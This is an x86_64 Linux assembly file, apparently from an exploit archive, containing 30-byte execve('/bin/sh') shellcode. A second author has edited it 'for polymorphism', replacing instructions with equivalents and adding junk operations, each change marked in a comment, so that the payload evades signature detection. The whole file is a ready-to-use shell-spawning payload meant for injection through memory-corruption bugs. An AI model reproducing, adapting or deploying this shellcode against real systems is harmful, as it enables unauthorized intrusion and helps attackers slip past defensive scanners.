;# Linux/x86_64 execve("/bin/sh"); 30 bytes shellcode
;# Date: 2010-04-26
;# Author: zbt
;# Tested on: x86_64 Debian GNU/Linux
;## edited for polymorphism by clubjk
 
    ; execve("/bin/sh", ["/bin/sh"], NULL)
 
    section .text
            global _start
 
    _start:
            ;;xor     rdx, rdx edited for polymorphism by clubjk
            mov rbx, rdx
	    sub rdx, rbx
	
            mov     qword rbx, '//bin/sh'
            shr     rbx, 0x8
            
            ;;push    rbx edited for polymorphism by clubjk
            mov qword [rsp-8],rbx
            sub rsp, 8  

            mov     rdi, rsp
            
            ;;push rax edited for polymorphism by clubjk
            mov qword [rsp-8], rax
            sub rsp, 8

            ;; added garbage with no effect for polymorphism by clubjk
	    add rcx, 10
	    xor rcx, rcx

            push    rdi
            mov     rsi, rsp
            mov     al, 0x3b
            syscall
 

